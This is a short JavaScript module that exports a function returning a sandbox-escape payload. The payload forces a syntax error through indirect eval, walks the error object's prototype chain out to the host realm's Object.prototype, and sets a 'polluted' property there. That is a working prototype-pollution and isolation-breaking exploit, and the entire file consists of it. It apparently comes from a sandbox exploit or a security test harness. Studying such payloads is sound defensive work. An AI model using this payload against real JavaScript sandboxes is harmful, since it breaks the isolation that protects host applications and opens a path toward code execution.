function getPayload() {
    return `
        let HostException;
        try{
             (0, eval)('--'+'>');
        }catch(e){
             HostException = e;
        }
        const HostObject = HostException.__proto__.__proto__.__proto__;
        HostObject.polluted = 'yes';
    `;
}

module.exports = { getPayload };